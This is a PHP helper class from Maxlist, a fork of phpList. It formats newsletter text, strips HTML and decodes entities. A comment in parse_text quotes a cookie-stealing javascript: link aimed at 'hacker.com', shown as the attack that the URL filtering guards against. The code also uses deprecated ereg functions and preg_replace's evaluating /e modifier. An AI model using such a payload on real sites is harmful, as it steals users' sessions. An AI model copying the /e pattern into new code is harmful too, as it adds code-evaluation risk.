<?php


/***
 * Project: Maxlist <br />
 * Copyright (C) 2007 Massimiliano Balestrieri
 * 
 * Software based on : 
 * PHPlist, Mailinglist system using PHP and Mysql
 * Copyright (C) 2000,2001,2002,2003,2004,2005 Michiel Dethmers, tincan ltd
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *
 * Maxlist is a fork of PhpList, a newsletter manager. 
 * The code was deeply changed so there are features of the original phpList and new ones. 
 * It uses smarty, generates XHTML strict, uses an AJAX layer, italian language ,
 * multi-istance, and use case based.
 *
 * Maxlist is a fork of PhpList, a newsletter manager. 
 * The code was deeply changed so there are features of the original phpList and new ones. 
 * It uses smarty, generates XHTML strict, uses an AJAX layer, italian language ,
 * multi-istance, and use case based.
 *
 * 
 * $Id: sendutils_helper.php 352 2007-12-20 19:11:32Z maxbnet $
 * $LastChangedDate: 2007-12-20 19:11:32 +0000 (Thu, 20 Dec 2007) $
 * $LastChangedRevision: 352 $
 * $LastChangedBy: maxbnet $
 * $HeadURL: file:///svn/p/maxlist/code/trunk/maxlist/app/models/helpers/sendutils_helper.php $
 * 
 * $Author: maxbnet $
 * $Date: 2007-12-20 19:11:32 +0000 (Thu, 20 Dec 2007) $
 */

class SendutilsHelper{
	
	
	public function parse_text($text) {
		# bug in PHP? get rid of newlines at the beginning of text
		$text = ltrim($text);
	
		# make urls and emails clickable
		$text = eregi_replace("([\._a-z0-9-]+@[\.a-z0-9-]+)", '<a href="mailto:\\1" class="email">\\1</a>', $text);
		$link_pattern = "/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";
	
		$i = 0;
		while (preg_match($link_pattern, $text, $matches)) {
			$url = $matches[2];
			$rest = $matches[3];
			if (!preg_match("/^(http:)|(mailto:)|(ftp:)|(https:)/i", $url)) {
				# avoid this
				#<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
				$url = preg_replace("/:/", "", $url);
			}
			$link[$i] = '<a href="' . $url . '" ' . $rest . '>' . $matches[4] . '</a>';
			$text = $matches[1] . "%%$i%%" . $matches[5];
			$i++;
		}
	
		$text = preg_replace("/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", "http://\\1", $text); #make www. -> http://www.
		$text = preg_replace("/(https?:\/\/)http?:\/\//i", "\\1", $text); #take out duplicate schema
		$text = preg_replace("/(ftp:\/\/)http?:\/\//i", "\\1", $text); #take out duplicate schema
		$text = preg_replace("/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", "<a href=\"\\1\\2\" class=\"url\" target=\"_blank\">\\2</a>", $text); #eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>
	
		$text = preg_replace("/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i", "<a href=\"\\1\\2\\3\" class=\"url\" target=\"_blank\">\\2\\3</a>", $text); #eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>
	
		# take off a possible last full stop and move it outside
		$text = preg_replace("/<a href=\"(.*?)\.\" class=\"url\" target=\"_blank\">(.*)\.<\/a>/i", "<a href=\"\\1\" class=\"url\" target=\"_blank\">\\2</a>.", $text);
	
		for ($j = 0; $j < $i; $j++) {
			$replacement = $link[$j];
			$text = preg_replace("/\%\%$j\%\%/", $replacement, $text);
		}
	
		# hmm, regular expression choke on some characters in the text
		# first replace all the brackets with placeholders.
		# we cannot use htmlspecialchars or addslashes, because some are needed
	
		$text = ereg_replace("\(", "<!--LB-->", $text);
		$text = ereg_replace("\)", "<!--RB-->", $text);
		$text = preg_replace('/\$/', "<!--DOLL-->", $text);
	
		# @@@ to be xhtml compabible we'd have to close the <p> as well
		# so for now, just make it two br/s, which will be done by replacing
		# \n with <br/>
		#  $paragraph = '<p>';
		$br = '<br />';
		$text = ereg_replace("\r", "", $text);
		#  $text = ereg_replace("\n\n","\n".$paragraph,$text);
		$text = ereg_replace("\n", "$br\n", $text);
	
		# reverse our previous placeholders
		$text = ereg_replace("<!--LB-->", "(", $text);
		$text = ereg_replace("<!--RB-->", ")", $text);
		$text = ereg_replace("<!--DOLL-->", "\$", $text);
		return $text;
	}
	
	public function strip_html($text) {
		# strip HTML, and turn links into the full URL
		$text = preg_replace("/\r/", "", $text);
	
		#$text = preg_replace("/\n/","###NL###",$text);
		$text = preg_replace("/<script[^>]*>(.*?)<\/script\s*>/is", "", $text);
		$text = preg_replace("/<style[^>]*>(.*?)<\/style\s*>/is", "", $text);
	
		# would prefer to use < and > but the strip tags below would erase that.
		#  $text = preg_replace("/<a href=\"(.*?)\"[^>]*>(.*?)<\/a>/is","\\2\n{\\1}",$text,100);
	
		$text = preg_replace("/<a href=\"(.*?)\"[^>]*>(.*?)<\/a>/is", "[URLTEXT]\\2[/URLTEXT][LINK]\\1[/LINK]", $text, 100);
	
		$text = preg_replace("/<b>(.*?)<\/b\s*>/is", "*\\1*", $text);
		$text = preg_replace("/<h[\d]>(.*?)<\/h[\d]\s*>/is", "**\\1**\n", $text);
		#  $text = preg_replace("/\s+/"," ",$text);
		$text = preg_replace("/<i>(.*?)<\/i\s*>/is", "/\\1/", $text);
		$text = preg_replace("/<\/tr\s*?>/i", "<\/tr>\n\n", $text);
		$text = preg_replace("/<\/p\s*?>/i", "<\/p>\n\n", $text);
		$text = preg_replace("/<br\s*?>/i", "<br>\n", $text);
		$text = preg_replace("/<br\s*?\/>/i", "<br\/>\n", $text);
		$text = preg_replace("/<table/i", "\n\n<table", $text);
		$text = strip_tags($text);
	
		# find all URLs and replace them back
		preg_match_all('~\[URLTEXT\](.*)\[/URLTEXT\]\[LINK\](.*)\[/LINK\]~Ui', $text, $links);
		foreach ($links[0] as $matchindex => $fullmatch) {
			$linktext = $links[1][$matchindex];
			$linkurl = $links[2][$matchindex];
			# check if the text linked is a repetition of the URL
			if (strtolower(trim($linktext)) == strtolower(trim($linkurl)) || 'http://' .
				strtolower(trim($linktext)) == strtolower(trim($linkurl))) {
				$linkreplace = $linkurl;
			} else {
				$linkreplace = $linktext . ' <' . strtolower($linkurl) . '>';
			}
			$text = preg_replace('~' . preg_quote($fullmatch) . '~', $linkreplace, $text);
		}
		$text = preg_replace("/<a href=\"(.*?)\"[^>]*>(.*?)<\/a>/is", "[URLTEXT]\\2[/URLTEXT][LINK]\\1[/LINK]", $text, 100);
	
		$text = $this->replace_chars($text);
		$text = preg_replace("/###NL###/", "\n", $text);
		# reduce whitespace
		while (preg_match("/  /", $text))
			$text = preg_replace("/  /", " ", $text);
		while (preg_match("/\n\s*\n\s*\n/", $text))
			$text = preg_replace("/\n\s*\n\s*\n/", "\n\n", $text);
		$text = wordwrap($text, 70);
		return $text;
	}
	
	
	public function replace_chars($text) {
		// $document should contain an HTML document.
		// This will remove HTML tags, javascript sections
		// and white space. It will also convert some
		// common HTML entities to their text equivalent.
	
		$search = array ("'&(quot|#34);'i",  // Replace html entities
		                 "'&(amp|#38);'i",
		                 "'&(lt|#60);'i",
		                 "'&(gt|#62);'i",
		                 "'&(nbsp|#160);'i",
		                 "'&(iexcl|#161);'i",
		                 "'&(cent|#162);'i",
		                 "'&(pound|#163);'i",
		                 "'&(copy|#169);'i",
		                 "'&#(\d+);'e");  // evaluate as php
		
		$replace = array ("\"",
		                  "&",
		                  "<",
		                  ">",
		                  " ",
		                  chr(161),
		                  chr(162),
		                  chr(163),
		                  chr(169),
		                  "chr(\\1)");
			#"
		$text = preg_replace ($search, $replace, $text);
		return $text;
	}
	
	public function add_html_footer($message, $footer) {
		if (preg_match('#</body>#imUx', $message)) {
			$message = preg_replace('#</body>#', $footer . '</body>', $message);
		} else {
			$message .= $footer;
		}
		return $message;
	}	
}